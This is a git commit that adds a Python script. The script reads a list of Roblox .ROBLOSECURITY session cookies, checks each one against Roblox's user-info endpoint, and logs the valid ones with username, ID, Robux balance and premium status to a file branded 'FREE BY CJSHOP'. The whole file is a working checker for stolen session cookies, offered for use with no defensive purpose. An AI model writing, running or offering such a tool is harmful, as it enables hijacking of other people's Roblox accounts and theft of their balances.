52dbd9a313a8f025fedcca2bbd28ed03094431b9
ChinJow <96903270+ChinJow@users.noreply.github.com>
2022-05-29 17:10:11 +0700

    Add files via upload

---
+++ main.py
@@ -0,0 +1,22 @@
+import requests
+def check():
+    lines = open('cookies.txt').read().splitlines()
+    linesset = set(lines)
+    for cookie in linesset:
+        try:
+            r = requests.get("https://www.roblox.com/mobileapi/userinfo", cookies={".ROBLOSECURITY": cookie}).json()
+            print("[>] Cookie Is Valid ...")
+            filee = open("VaidCookie.txt", "a")
+            filee.write(f"Cookie : {cookie}\nUser Id : " + str(r["UserID"]) +"\n" + "Username : " + str(r["UserName"]) +"\n"+ "Balance : " + str(r["RobuxBalance"]) +"\n"+ "Picture : " + str(r["ThumbnailUrl"]) +"\n"+ "Club Member : " + str(r["IsAnyBuildersClubMember"]) +"\n"+ "Premium : " + str(r["IsPremium"])+"\n-------------------------------------------------------------------------------- FREE BY CJSHOP--------------------------------------------------------------------------------\n")
+        except Exception:
+            print("[!] Cookie Is Invalid ...")
+            fileee = open("InvaidCookie.txt", "a")
+            fileee.write(cookie + "\n")
+            fileee.close()
+
+if __name__ == '__main__':
+    check()
+
+
+
+
